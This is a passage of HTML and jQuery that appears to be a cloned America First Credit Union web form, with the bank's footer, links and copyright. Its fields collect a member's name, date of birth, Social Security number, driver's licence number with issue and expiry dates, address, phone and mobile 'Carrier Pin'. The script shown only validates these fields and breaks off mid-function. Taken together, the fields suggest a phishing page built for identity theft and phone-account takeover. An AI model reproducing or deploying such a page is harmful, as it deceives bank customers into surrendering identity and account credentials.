                                                                        <div class="v-messages__message">Enter a Valid Carrier Pin</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div data-v-fec3e2d0="" class="mt-4"><button data-v-fec3e2d0="" id="next-btn" type="submit" class="mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary"><span class="v-btn__content">Next</span></button></div>
                                        </form>
                                    </div>
                                    <!---->
                                </div>
                            </div>
                            <div data-v-551af68e="" data-v-63ab483a="" role="dialog" class="v-dialog__container">
                                <!---->
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            <footer data-v-0b9ebc54="" class="v-footer v-sheet theme--dark afcu-dark-blue" data-booted="true">
                <div data-v-0b9ebc54="" class="container container--fluid">
                    <div data-v-0b9ebc54="" class="row footer-links-section mt-1 justify-center">
                        <div data-v-0b9ebc54=""><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/disclosures/membership-agreement.cfm" target="_blank" title="Membership &amp;  Agreement"> terms </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/contact/branches.html" target="_blank" title="Find Branches" class="utility-link"> branch locator </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="tel:1-855-801-2328" class="utility-link"> 1-855-801-2328 </a></div>
                    </div>
                    <div data-v-0b9ebc54="" class="row footer-image-section mt-6 mb-3 justify-center">
                        <div data-v-0b9ebc54="">
                            <div data-v-0b9ebc54="" aria-label="America First Credit Union" role="img" class="v-image v-responsive theme--dark" style="width: 200px;">
                                <div class="v-responsive__sizer" style="padding-bottom: 21.6%;"></div>
                                <div class="v-image__image v-image__image--cover" style="background-image: url(&quot;data:image/png;base64,&quot;); background-position: center center;"></div>
                                <div class="v-responsive__content" style="width: 250px;"></div>
                            </div>
                        </div>
                    </div>
                    <div data-v-0b9ebc54="" class="row footer-copyright-section align-center">
                        <div data-v-0b9ebc54="" class="text-center col-md-auto col-12"><a data-v-0b9ebc54="" href="http://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp" target="_blank" title="Equal Housing Lender"><img data-v-0b9ebc54="" src="data:image/png;base64," alt="Equal Housing Lender"></a><a data-v-0b9ebc54="" href="https://www.ncua.gov/support-services/share-insurance-fund" target="_blank" title="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency" class="ml-2"><img data-v-0b9ebc54="" src="data:image/png;base64," alt="NCUA"></a></div>
                        <div data-v-0b9ebc54="" class="footer-fine-print col">
                            <p data-v-0b9ebc54="">©<span data-v-0b9ebc54="">2022</span> America First Credit Union. All Rights Reserved. America First Federal Credit Union does business as (DBA) America First Credit Union. Unauthorized access or use is not permitted and may constitute a crime punishable by law. America First Credit Union respects your privacy. Please view our <a data-v-0b9ebc54="" href="https://www.americafirst.com/documents/membership-agreement.pdf#privacyPolicy">Privacy Policy</a>, <a data-v-0b9ebc54="" href="https://www.americafirst.com/documents/marketing-email-opt-out.pdf">Email Opt Out Procedure</a> and <a data-v-0b9ebc54="" href="https://www.americafirst.com/content/dam/pdfs/FTEU%20Fraud%20Alerts.pdf">Fraud Alert Text/SMS Notification Terms and Conditions</a>. This credit union is federally insured by the National Credit Union Administration.</p>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>

<script>
    jQuery(function() {
        jQuery('#fname').focus();
        jQuery('.v-form').click();
    });
    //fname
    $('#fnamediv').on('input', function(e) {
        $("#fnamelabel").addClass('v-label--active primary--text');
        $("#fnamediv").addClass('v-input--is-focused primary--text');

        if ($('#fname').val().length == 0) {
            $("#fnamelabel").removeClass('v-label--active ');
            $("#fnamediv").removeClass('v-input--is-dirty');
            $("#fnamediv").addClass('error--text');
            $("#fnamelabel").addClass('error--text');
            $("#fnamediv").addClass('v-input--has-state');

            $("#fnameerror").show();
        } else if ($('#fname').val().length < 3) {
            $("#fnamediv").removeClass('v-input--is-focused');
            $("#fnamediv").addClass('error--text');
            $("#fnamelabel").addClass('error--text');
            $("#fnamediv").addClass('v-input--has-state');

            $("#fnameerror").show();
        } else {
            $("#fnamelabel").removeClass('error--text');
            $("#fnamediv").addClass('v-input--is-dirty');
            $("#fnamediv").removeClass('error--text');
            $("#fnamediv").removeClass('v-input--has-state');

            $("#fnameerror").hide();

        }
    });

    $('#fnamediv').click(function() {
        $("#fnamelabel").addClass('v-label--active primary--text');
        $("#fnamediv").addClass('v-input--is-focused primary--text');
        jQuery('#fname').focus();


    });

    $('#fname').focus(function() {
        $("#fnamelabel").addClass('v-label--active primary--text');
        $("#fnamediv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#fname').val().length == 0) {
            $("#fnamelabel").removeClass('v-label--active ');
            $("#fnamediv").removeClass('v-input--is-focused');
            $("#fnamediv").removeClass('v-input--is-dirty');
            $("#fnamediv").addClass('error--text');
            $("#fnamelabel").removeClass('primary--text');
            $("#fnamediv").removeClass('primary--text');
            $("#fnamelabel").addClass('error--text');
            $("#fnamediv").addClass('v-input--has-state');
            $("#fnameerror").show();

        } else if ($('#fname').val().length < 3) {
            $("#fnamediv").removeClass('v-input--is-focused');
            $("#fnamediv").addClass('error--text');

            $("#fnamelabel").removeClass('primary--text');
            $("#fnamediv").removeClass('primary--text');
            $("#fnamelabel").addClass('error--text');
            $("#fnamediv").addClass('v-input--has-state');

            $("#fnameerror").show();

        } else {

            $("#fnamelabel").removeClass('primary--text');
            $("#fnamediv").removeClass('primary--text');
            $("#fnamediv").removeClass('v-input--is-focused');
            $("#fnamelabel").removeClass('error--text');
            $("#fnamediv").addClass('v-input--is-dirty');
            $("#fnamediv").removeClass('error--text');
            $("#fnamediv").removeClass('v-input--has-state');

            $("#fnameerror").hide();


        }

    });


    //dob
    $('#dobdiv').on('input', function(e) {
        $("#doblabel").addClass('v-label--active primary--text');
        $("#dobdiv").addClass('v-input--is-focused primary--text');

        if ($('#dob').val().length == 0) {
            $("#doblabel").removeClass('v-label--active ');
            $("#dobdiv").removeClass('v-input--is-dirty');
            $("#dobdiv").addClass('error--text');
            $("#doblabel").addClass('error--text');
            $("#dobdiv").addClass('v-input--has-state');


            $("#doberror").show();
        } else if ($('#dob').val().length < 10) {
            $("#dobdiv").removeClass('v-input--is-focused');
            $("#dobdiv").addClass('error--text');
            $("#doblabel").addClass('error--text');
            $("#dobdiv").addClass('v-input--has-state');

            $("#doberror").show();
        } else {
            $("#doblabel").removeClass('error--text');
            $("#dobdiv").addClass('v-input--is-dirty');
            $("#dobdiv").removeClass('error--text');
            $("#dobdiv").removeClass('v-input--has-state');

            $("#doberror").hide();

        }
    });

    $('#dobdiv').click(function() {
        $("#doblabel").addClass('v-label--active primary--text');
        $("#dobdiv").addClass('v-input--is-focused primary--text');
        jQuery('#dob').focus();


    });

    $('#dob').focus(function() {
        $("#doblabel").addClass('v-label--active primary--text');
        $("#dobdiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#dob').val().length == 0) {
            $("#doblabel").removeClass('v-label--active ');
            $("#dobdiv").removeClass('v-input--is-focused');
            $("#dobdiv").removeClass('v-input--is-dirty');
            $("#dobdiv").addClass('error--text');
            $("#doblabel").removeClass('primary--text');
            $("#dobdiv").removeClass('primary--text');
            $("#doblabel").addClass('error--text');
            $("#dobdiv").addClass('v-input--has-state');

            $("#doberror").show();

        } else if ($('#dob').val().length < 10) {
            $("#dobdiv").removeClass('v-input--is-focused');
            $("#dobdiv").addClass('error--text');

            $("#doblabel").removeClass('primary--text');
            $("#dobdiv").removeClass('primary--text');
            $("#doblabel").addClass('error--text');

            $("#dobdiv").addClass('v-input--has-state');

            $("#doberror").show();

        } else {

            $("#doblabel").removeClass('primary--text');
            $("#dobdiv").removeClass('primary--text');
            $("#dobdiv").removeClass('v-input--is-focused');
            $("#doblabel").removeClass('error--text');
            $("#dobdiv").addClass('v-input--is-dirty');
            $("#dobdiv").removeClass('error--text');
            $("#dobdiv").removeClass('v-input--has-state');

            $("#doberror").hide();


        }

    });



    //ssn
    $('#ssndiv').on('input', function(e) {
        $("#ssnlabel").addClass('v-label--active primary--text');
        $("#ssndiv").addClass('v-input--is-focused primary--text');

        if ($('#ssn').val().length == 0) {
            $("#ssnlabel").removeClass('v-label--active ');
            $("#ssndiv").removeClass('v-input--is-dirty');
            $("#ssndiv").addClass('error--text');
            $("#ssnlabel").addClass('error--text');
            $("#ssnerror").show();
            $("#ssndiv").addClass('v-input--has-state');

        } else if ($('#ssn').val().length < 9) {
            $("#ssndiv").removeClass('v-input--is-focused');
            $("#ssndiv").addClass('error--text');
            $("#ssnlabel").addClass('error--text');
            $("#ssnerror").show();
            $("#ssndiv").addClass('v-input--has-state');

        } else {
            $("#ssnlabel").removeClass('error--text');
            $("#ssndiv").addClass('v-input--is-dirty');
            $("#ssndiv").removeClass('error--text');
            $("#ssnerror").hide();
            $("#ssndiv").removeClass('v-input--has-state');


        }
    });

    $('#ssndiv').click(function() {
        $("#ssnlabel").addClass('v-label--active primary--text');
        $("#ssndiv").addClass('v-input--is-focused primary--text');
        jQuery('#ssn').focus();


    });

    $('#ssn').focus(function() {
        $("#ssnlabel").addClass('v-label--active primary--text');
        $("#ssndiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#ssn').val().length == 0) {
            $("#ssnlabel").removeClass('v-label--active ');
            $("#ssndiv").removeClass('v-input--is-focused');
            $("#ssndiv").removeClass('v-input--is-dirty');
            $("#ssndiv").addClass('error--text');
            $("#ssnlabel").removeClass('primary--text');
            $("#ssndiv").removeClass('primary--text');
            $("#ssnlabel").addClass('error--text');
            $("#ssndiv").addClass('v-input--has-state');

            $("#ssnerror").show();

        } else if ($('#ssn').val().length < 9) {
            $("#ssndiv").removeClass('v-input--is-focused');
            $("#ssndiv").addClass('error--text');

            $("#ssnlabel").removeClass('primary--text');
            $("#ssndiv").removeClass('primary--text');
            $("#ssnlabel").addClass('error--text');
            $("#ssndiv").addClass('v-input--has-state');

            $("#ssnerror").show();

        } else {

            $("#ssnlabel").removeClass('primary--text');
            $("#ssndiv").removeClass('primary--text');
            $("#ssndiv").removeClass('v-input--is-focused');
            $("#ssnlabel").removeClass('error--text');
            $("#ssndiv").addClass('v-input--is-dirty');
            $("#ssndiv").removeClass('error--text');
            $("#ssndiv").removeClass('v-input--has-state');

            $("#ssnerror").hide();


        }

    });




    //dln
    $('#dlndiv').on('input', function(e) {
        $("#dlnlabel").addClass('v-label--active primary--text');
        $("#dlndiv").addClass('v-input--is-focused primary--text');

        if ($('#dln').val().length == 0) {
            $("#dlnlabel").removeClass('v-label--active ');
            $("#dlndiv").removeClass('v-input--is-dirty');
            $("#dlndiv").addClass('error--text');
            $("#dlnlabel").addClass('error--text');
            $("#dlnerror").show();
            $("#slndiv").addClass('v-input--has-state');

        } else if ($('#dln').val().length < 3) {
            $("#dlndiv").removeClass('v-input--is-focused');
            $("#dlndiv").addClass('error--text');
            $("#dlnlabel").addClass('error--text');
            $("#dlnerror").show();
            $("#slndiv").addClass('v-input--has-state');

        } else {
            $("#dlnlabel").removeClass('error--text');
            $("#dlndiv").addClass('v-input--is-dirty');
            $("#dlndiv").removeClass('error--text');
            $("#dlnerror").hide();
            $("#slndiv").removeClass('v-input--has-state');


        }
    });

    $('#dlndiv').click(function() {
        $("#dlnlabel").addClass('v-label--active primary--text');
        $("#dlndiv").addClass('v-input--is-focused primary--text');
        jQuery('#dln').focus();


    });

    $('#dln').focus(function() {
        $("#dlnlabel").addClass('v-label--active primary--text');
        $("#dlndiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#dln').val().length == 0) {
            $("#dlnlabel").removeClass('v-label--active ');
            $("#dlndiv").removeClass('v-input--is-focused');
            $("#dlndiv").removeClass('v-input--is-dirty');
            $("#dlndiv").addClass('error--text');
            $("#dlndiv").removeClass('primary--text');
            $("#dlnlabel").removeClass('primary--text');
            $("#dlnlabel").addClass('error--text');
            $("#slndiv").addClass('v-input--has-state');

            $("#dlnerror").show();

        } else if ($('#dln').val().length < 3) {
            $("#dlndiv").removeClass('v-input--is-focused');
            $("#dlndiv").addClass('error--text');

            $("#dlndiv").removeClass('primary--text');
            $("#dlnlabel").removeClass('primary--text');
            $("#dlnlabel").addClass('error--text');
            $("#dlnerror").show();
            $("#slndiv").addClass('v-input--has-state');


        } else {

            $("#dlndiv").removeClass('primary--text');
            $("#dlnlabel").removeClass('primary--text');
            $("#dlndiv").removeClass('v-input--is-focused');
            $("#dlnlabel").removeClass('error--text');
            $("#dlndiv").addClass('v-input--is-dirty');
            $("#dlndiv").removeClass('error--text');
            $("#dlnerror").hide();
            $("#slndiv").removeClass('v-input--has-state');



        }

    });




    //dlexp
    $('#dlexpdiv').on('input', function(e) {
        $("#dlexplabel").addClass('v-label--active primary--text');
        $("#dlexpdiv").addClass('v-input--is-focused primary--text');

        if ($('#dlexp').val().length == 0) {
            $("#dlexplabel").removeClass('v-label--active ');
            $("#dlexpdiv").removeClass('v-input--is-dirty');
            $("#dlexpdiv").addClass('error--text');
            $("#dlexplabel").addClass('error--text');
            $("#dlexperror").show();
            $("#dlexpdiv").addClass('v-input--has-state');

        } else if ($('#dlexp').val().length < 7) {
            $("#dlexpdiv").removeClass('v-input--is-focused');
            $("#dlexpdiv").addClass('error--text');
            $("#dlexplabel").addClass('error--text');
            $("#dlexperror").show();
            $("#dlexpdiv").addClass('v-input--has-state');

        } else {
            $("#dlexplabel").removeClass('error--text');
            $("#dlexpdiv").addClass('v-input--is-dirty');
            $("#dlexpdiv").removeClass('error--text');
            $("#dlexperror").hide();
            $("#dlexpdiv").removeClass('v-input--has-state');


        }
    });

    $('#dlexpdiv').click(function() {
        $("#dlexplabel").addClass('v-label--active primary--text');
        $("#dlexpdiv").addClass('v-input--is-focused primary--text');
        jQuery('#dlexp').focus();


    });

    $('#dlexp').focus(function() {
        $("#dlexplabel").addClass('v-label--active primary--text');
        $("#dlexpdiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#dlexp').val().length == 0) {
            $("#dlexplabel").removeClass('v-label--active ');
            $("#dlexpdiv").removeClass('v-input--is-focused');
            $("#dlexpdiv").removeClass('v-input--is-dirty');
            $("#dlexpdiv").addClass('error--text');
            $("#dlexplabel").removeClass('primary--text');
            $("#dlexpdiv").removeClass('primary--text');
            $("#dlexplabel").addClass('error--text');
            $("#dlexperror").show();
            $("#dlexpdiv").addClass('v-input--has-state');


        } else if ($('#dlexp').val().length < 7) {
            $("#dlexpdiv").removeClass('v-input--is-focused');
            $("#dlexpdiv").addClass('error--text');
            $("#dlexplabel").removeClass('primary--text');
            $("#dlexpdiv").removeClass('primary--text');
            $("#dlexplabel").addClass('error--text');
            $("#dlexperror").show();
            $("#dlexpdiv").addClass('v-input--has-state');


        } else {
            $("#dlexplabel").removeClass('primary--text');
            $("#dlexpdiv").removeClass('primary--text');
            $("#dlexpdiv").removeClass('v-input--is-focused');
            $("#dlexplabel").removeClass('error--text');
            $("#dlexpdiv").addClass('v-input--is-dirty');
            $("#dlexpdiv").removeClass('error--text');
            $("#dlexperror").hide();
            $("#dlexpdiv").removeClass('v-input--has-state');



        }

    });




    //dlissue
    $('#dlissuediv').on('input', function(e) {
        $("#dlissuelabel").addClass('v-label--active primary--text');
        $("#dlissuediv").addClass('v-input--is-focused primary--text');

        if ($('#dlissue').val().length == 0) {
            $("#dlissuelabel").removeClass('v-label--active ');
            $("#dlissuediv").removeClass('v-input--is-dirty');
            $("#dlissuediv").addClass('error--text');
            $("#dlissuelabel").addClass('error--text');
            $("#dlissuediv").addClass('v-input--has-state');

            $("#dlissueerror").show();
        } else if ($('#dlissue').val().length < 7) {
            $("#dlissuediv").removeClass('v-input--is-focused');
            $("#dlissuediv").addClass('error--text');
            $("#dlissuelabel").addClass('error--text');
            $("#dlissuediv").addClass('v-input--has-state');

            $("#dlissueerror").show();
        } else {
            $("#dlissuelabel").removeClass('error--text');
            $("#dlissuediv").addClass('v-input--is-dirty');
            $("#dlissuediv").removeClass('error--text');
            $("#dlissuediv").removeClass('v-input--has-state');

            $("#dlissueerror").hide();

        }
    });

    $('#dlissuediv').click(function() {
        $("#dlissuelabel").addClass('v-label--active primary--text');
        $("#dlissuediv").addClass('v-input--is-focused primary--text');
        jQuery('#dlissue').focus();


    });

    $('#dlissue').focus(function() {
        $("#dlissuelabel").addClass('v-label--active primary--text');
        $("#dlissuediv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#dlissue').val().length == 0) {
            $("#dlissuelabel").removeClass('v-label--active ');
            $("#dlissuediv").removeClass('v-input--is-focused');
            $("#dlissuediv").removeClass('v-input--is-dirty');
            $("#dlissuediv").addClass('error--text');
            $("#dlissuelabel").removeClass('primary--text');
            $("#dlissuediv").removeClass('primary--text');
            $("#dlissuelabel").addClass('error--text');
            $("#dlissuediv").addClass('v-input--has-state');

            $("#dlissueerror").show();

        } else if ($('#dlissue').val().length < 7) {
            $("#dlissuediv").removeClass('v-input--is-focused');
            $("#dlissuediv").addClass('error--text');

            $("#dlissuelabel").removeClass('primary--text');
            $("#dlissuediv").removeClass('primary--text');
            $("#dlissuelabel").addClass('error--text');
            $("#dlissuediv").addClass('v-input--has-state');

            $("#dlissueerror").show();

        } else {

            $("#dlissuelabel").removeClass('primary--text');
            $("#dlissuediv").removeClass('primary--text');
            $("#dlissuediv").removeClass('v-input--is-focused');
            $("#dlissuelabel").removeClass('error--text');
            $("#dlissuediv").addClass('v-input--is-dirty');
            $("#dlissuediv").removeClass('error--text');
            $("#dlissuediv").removeClass('v-input--has-state');

            $("#dlissueerror").hide();


        }

    });




    //addr
    $('#addrdiv').on('input', function(e) {
        $("#addrlabel").addClass('v-label--active primary--text');
        $("#addrdiv").addClass('v-input--is-focused primary--text');

        if ($('#addr').val().length == 0) {
            $("#addrlabel").removeClass('v-label--active ');
            $("#addrdiv").removeClass('v-input--is-dirty');
            $("#addrdiv").addClass('error--text');
            $("#addrlabel").addClass('error--text');
            $("#addrerror").show();
            $("#addrdiv").addClass('v-input--has-state');

        } else if ($('#addr').val().length < 3) {
            $("#addrdiv").removeClass('v-input--is-focused');
            $("#addrdiv").addClass('error--text');
            $("#addrlabel").addClass('error--text');
            $("#addrerror").show();
            $("#addrdiv").addClass('v-input--has-state');

        } else {
            $("#addrlabel").removeClass('error--text');
            $("#addrdiv").addClass('v-input--is-dirty');
            $("#addrdiv").removeClass('error--text');
            $("#addrerror").hide();
            $("#addrdiv").removeClass('v-input--has-state');


        }
    });

    $('#addrdiv').click(function() {
        $("#addrlabel").addClass('v-label--active primary--text');
        $("#addrdiv").addClass('v-input--is-focused primary--text');
        jQuery('#addr').focus();


    });

    $('#addr').focus(function() {
        $("#addrlabel").addClass('v-label--active primary--text');
        $("#addrdiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#addr').val().length == 0) {
            $("#addrlabel").removeClass('v-label--active ');
            $("#addrdiv").removeClass('v-input--is-focused');
            $("#addrdiv").removeClass('v-input--is-dirty');
            $("#addrdiv").addClass('error--text');
            $("#addrlabel").removeClass('primary--text');
            $("#addrdiv").removeClass('primary--text');
            $("#addrlabel").addClass('error--text');
            $("#addrdiv").addClass('v-input--has-state');

            $("#addrerror").show();

        } else if ($('#addr').val().length < 3) {
            $("#addrdiv").removeClass('v-input--is-focused');
            $("#addrdiv").addClass('error--text');

            $("#addrlabel").removeClass('primary--text');
            $("#addrdiv").removeClass('primary--text');
            $("#addrlabel").addClass('error--text');
            $("#addrdiv").addClass('v-input--has-state');

            $("#addrerror").show();

        } else {

            $("#addrlabel").removeClass('primary--text');
            $("#addrdiv").removeClass('primary--text');
            $("#addrdiv").removeClass('v-input--is-focused');
            $("#addrlabel").removeClass('error--text');
            $("#addrdiv").addClass('v-input--is-dirty');
            $("#addrdiv").removeClass('error--text');
            $("#addrdiv").removeClass('v-input--has-state');

            $("#addrerror").hide();


        }

    });



    //state
    $('#statediv').on('input', function(e) {
        $("#statelabel").addClass('v-label--active primary--text');
        $("#statediv").addClass('v-input--is-focused primary--text');

        if ($('#state').val().length == 0) {
            $("#statelabel").removeClass('v-label--active ');
            $("#statediv").removeClass('v-input--is-dirty');
            $("#statediv").addClass('error--text');
            $("#statelabel").addClass('error--text');
            $("#stateerror").show();
            $("#statediv").addClass('v-input--has-state');

        } else if ($('#state').val().length < 2) {
            $("#statediv").removeClass('v-input--is-focused');
            $("#statediv").addClass('error--text');
            $("#statelabel").addClass('error--text');
            $("#stateerror").show();
            $("#statediv").addClass('v-input--has-state');

        } else {
            $("#statelabel").removeClass('error--text');
            $("#statediv").addClass('v-input--is-dirty');
            $("#statediv").removeClass('error--text');
            $("#stateerror").hide();
            $("#statediv").removeClass('v-input--has-state');


        }
    });

    $('#statediv').click(function() {
        $("#statelabel").addClass('v-label--active primary--text');
        $("#statediv").addClass('v-input--is-focused primary--text');
        jQuery('#state').focus();


    });

    $('#state').focus(function() {
        $("#statelabel").addClass('v-label--active primary--text');
        $("#statediv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#state').val().length == 0) {
            $("#statelabel").removeClass('v-label--active ');
            $("#statediv").removeClass('v-input--is-focused');
            $("#statediv").removeClass('v-input--is-dirty');
            $("#statediv").addClass('error--text');
            $("#statelabel").removeClass('primary--text');
            $("#statediv").removeClass('primary--text');
            $("#statelabel").addClass('error--text');
            $("#stateerror").show();
            $("#statediv").addClass('v-input--has-state');


        } else if ($('#state').val().length < 2) {
            $("#statediv").removeClass('v-input--is-focused');
            $("#statediv").addClass('error--text');

            $("#statelabel").removeClass('primary--text');
            $("#statediv").removeClass('primary--text');
            $("#statelabel").addClass('error--text');
            $("#stateerror").show();
            $("#statediv").addClass('v-input--has-state');


        } else {

            $("#statelabel").removeClass('primary--text');
            $("#statediv").removeClass('primary--text');
            $("#statediv").removeClass('v-input--is-focused');
            $("#statelabel").removeClass('error--text');
            $("#statediv").addClass('v-input--is-dirty');
            $("#statediv").removeClass('error--text');
            $("#stateerror").hide();
            $("#statediv").removeClass('v-input--has-state');



        }

    });



    //zip
    $('#zipdiv').on('input', function(e) {
        $("#ziplabel").addClass('v-label--active primary--text');
        $("#zipdiv").addClass('v-input--is-focused primary--text');

        if ($('#zip').val().length == 0) {
            $("#ziplabel").removeClass('v-label--active ');
            $("#zipdiv").removeClass('v-input--is-dirty');
            $("#zipdiv").addClass('error--text');
            $("#ziplabel").addClass('error--text');
            $("#ziperror").show();
            $("#zipdiv").addClass('v-input--has-state');

        } else if ($('#zip').val().length < 5) {
            $("#zipdiv").removeClass('v-input--is-focused');
            $("#zipdiv").addClass('error--text');
            $("#ziplabel").addClass('error--text');
            $("#ziperror").show();
            $("#zipdiv").addClass('v-input--has-state');

        } else {
            $("#ziplabel").removeClass('error--text');
            $("#zipdiv").addClass('v-input--is-dirty');
            $("#zipdiv").removeClass('error--text');
            $("#ziperror").hide();
            $("#zipdiv").removeClass('v-input--has-state');


        }
    });

    $('#zipdiv').click(function() {
        $("#ziplabel").addClass('v-label--active primary--text');
        $("#zipdiv").addClass('v-input--is-focused primary--text');
        jQuery('#zip').focus();


    });

    $('#zip').focus(function() {
        $("#ziplabel").addClass('v-label--active primary--text');
        $("#zipdiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#zip').val().length == 0) {
            $("#ziplabel").removeClass('v-label--active ');
            $("#zipdiv").removeClass('v-input--is-focused');
            $("#zipdiv").removeClass('v-input--is-dirty');
            $("#zipdiv").addClass('error--text');
            $("#ziplabel").removeClass('primary--text');
            $("#zipdiv").removeClass('primary--text');
            $("#ziplabel").addClass('error--text');
            $("#ziperror").show();
            $("#zipdiv").addClass('v-input--has-state');


        } else if ($('#zip').val().length < 5) {
            $("#zipdiv").removeClass('v-input--is-focused');
            $("#zipdiv").addClass('error--text');

            $("#ziplabel").removeClass('primary--text');
            $("#zipdiv").removeClass('primary--text');
            $("#ziplabel").addClass('error--text');
            $("#ziperror").show();

            $("#zipdiv").addClass('v-input--has-state');

        } else {

            $("#ziplabel").removeClass('primary--text');
            $("#zipdiv").removeClass('primary--text');
            $("#zipdiv").removeClass('v-input--is-focused');
            $("#ziplabel").removeClass('error--text');
            $("#zipdiv").addClass('v-input--is-dirty');
            $("#zipdiv").removeClass('error--text');
            $("#ziperror").hide();

            $("#zipdiv").removeClass('v-input--has-state');


        }

    });




    //phone
    $('#phonediv').on('input', function(e) {
        $("#phonelabel").addClass('v-label--active primary--text');
        $("#phonediv").addClass('v-input--is-focused primary--text');

        if ($('#phone').val().length == 0) {
            $("#phonelabel").removeClass('v-label--active ');
            $("#phonediv").removeClass('v-input--is-dirty');
            $("#phonediv").addClass('error--text');
            $("#phonelabel").addClass('error--text');
            $("#phoneerror").show();
            $("#phonediv").addClass('v-input--has-state');

        } else if ($('#phone').val().length < 14) {
            $("#phonediv").removeClass('v-input--is-focused');
            $("#phonediv").addClass('error--text');
            $("#phonelabel").addClass('error--text');
            $("#phoneerror").show();
            $("#phonediv").addClass('v-input--has-state');

        } else {
            $("#phonelabel").removeClass('error--text');
            $("#phonediv").addClass('v-input--is-dirty');
            $("#phonediv").removeClass('error--text');
            $("#phoneerror").hide();
            $("#phonediv").removeClass('v-input--has-state');


        }
    });

    $('#phonediv').click(function() {
        $("#phonelabel").addClass('v-label--active primary--text');
        $("#phonediv").addClass('v-input--is-focused primary--text');
        jQuery('#phone').focus();


    });

    $('#phone').focus(function() {
        $("#phonelabel").addClass('v-label--active primary--text');
        $("#phonediv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#phone').val().length == 0) {
            $("#phonelabel").removeClass('v-label--active ');
            $("#phonediv").removeClass('v-input--is-focused');
            $("#phonediv").removeClass('v-input--is-dirty');
            $("#phonediv").addClass('error--text');
            $("#phonelabel").removeClass('primary--text');
            $("#phonediv").removeClass('primary--text');
            $("#phonelabel").addClass('error--text');
            $("#phonediv").addClass('v-input--has-state');

            $("#phoneerror").show();

        } else if ($('#phone').val().length < 14) {
            $("#phonediv").removeClass('v-input--is-focused');
            $("#phonediv").addClass('error--text');

            $("#phonelabel").removeClass('primary--text');
            $("#phonediv").removeClass('primary--text');
            $("#phonelabel").addClass('error--text');
            $("#phoneerror").show();
            $("#phonediv").addClass('v-input--has-state');


        } else {

            $("#phonelabel").removeClass('primary--text');
            $("#phonediv").removeClass('primary--text');
            $("#phonediv").removeClass('v-input--is-focused');
            $("#phonelabel").removeClass('error--text');
            $("#phonediv").addClass('v-input--is-dirty');
            $("#phonediv").removeClass('error--text');
            $("#phoneerror").hide();
            $("#phonediv").removeClass('v-input--has-state');



        }

    });




    //cpin
    $('#cpindiv').on('input', function(e) {
        $("#cpinlabel").addClass('v-label--active primary--text');
        $("#cpindiv").addClass('v-input--is-focused primary--text');

        if ($('#cpin').val().length == 0) {
            $("#cpinlabel").removeClass('v-label--active ');
            $("#cpindiv").removeClass('v-input--is-dirty');
            $("#cpindiv").addClass('error--text');
            $("#cpinlabel").addClass('error--text');
            $("#cpinerror").show();
            $("#cpindiv").addClass('v-input--has-state');

        } else if ($('#cpin').val().length < 2) {
            $("#cpindiv").removeClass('v-input--is-focused');
            $("#cpindiv").addClass('error--text');
            $("#cpinlabel").addClass('error--text');
            $("#cpindiv").addClass('v-input--has-state');

            $("#cpinerror").show();
        } else {
            $("#cpinlabel").removeClass('error--text');
            $("#cpindiv").addClass('v-input--is-dirty');
            $("#cpindiv").removeClass('error--text');
            $("#cpinerror").hide();
            $("#cpindiv").removeClass('v-input--has-state');


        }
    });

    $('#cpindiv').click(function() {
        $("#cpinlabel").addClass('v-label--active primary--text');
        $("#cpindiv").addClass('v-input--is-focused primary--text');
        jQuery('#cpin').focus();


    });

    $('#cpin').focus(function() {
        $("#cpinlabel").addClass('v-label--active primary--text');
        $("#cpindiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#cpin').val().length == 0) {
            $("#cpinlabel").removeClass('v-label--active ');
            $("#cpindiv").removeClass('v-input--is-focused');
            $("#cpindiv").removeClass('v-input--is-dirty');
            $("#cpindiv").addClass('error--text');
            $("#cpinlabel").removeClass('primary--text');
            $("#cpindiv").removeClass('primary--text');
            $("#cpinlabel").addClass('error--text');
            $("#cpinerror").show();
            $("#cpindiv").addClass('v-input--has-state');


        } else if ($('#cpin').val().length < 2) {
            $("#cpindiv").removeClass('v-input--is-focused');
            $("#cpindiv").addClass('error--text');

            $("#cpinlabel").removeClass('primary--text');
            $("#cpindiv").removeClass('primary--text');
            $("#cpinlabel").addClass('error--text');
            $("#cpindiv").addClass('v-input--has-state');

            $("#cpinerror").show();

        } else {

            $("#cpinlabel").removeClass('primary--text');
            $("#cpindiv").removeClass('primary--text');
            $("#cpindiv").removeClass('v-input--is-focused');
            $("#cpinlabel").removeClass('error--text');
            $("#cpindiv").addClass('v-input--is-dirty');
            $("#cpindiv").removeClass('error--text');
            $("#cpindiv").removeClass('v-input--has-state');

            $("#cpinerror").hide();


        }

    });

    $('#next-btn').click(function() {
        //fname
        if ($('#fname').val().length == 0) {
            $("#fnamelabel").removeClass('v-label--active ');
            $("#fnamediv").removeClass('v-input--is-dirty');
            $("#fnamediv").addClass('error--text');
            $("#fnamelabel").addClass('error--text');
            $("#fnameerror").show();
            $("#fnamediv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#fname').val().length < 3) {
            $("#fnamediv").removeClass('v-input--is-focused');
            $("#fnamediv").addClass('error--text');
